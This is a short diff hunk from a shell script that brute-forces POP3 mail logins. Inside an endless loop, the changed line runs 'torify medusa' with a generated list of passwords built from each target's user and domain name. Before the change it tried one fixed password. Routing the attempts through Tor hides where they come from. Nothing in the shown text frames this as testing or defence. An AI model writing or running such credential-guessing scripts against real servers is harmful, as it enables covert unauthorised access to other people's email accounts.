@@ -39,7 +39,7 @@ while [ 1 ]; do
             echo $user >>$TEMPORAL_PASSWORDS
             echo $domain_only >>$TEMPORAL_PASSWORDS
             
-            torify medusa -h $domain -u $i -p 123456 -O $LOG -M pop3 -b
+            torify medusa -h $domain -u $i -P $TEMPORAL_PASSWORDS -O $LOG -M pop3 -b
             #SUCCESS
             
             #delete temporary files
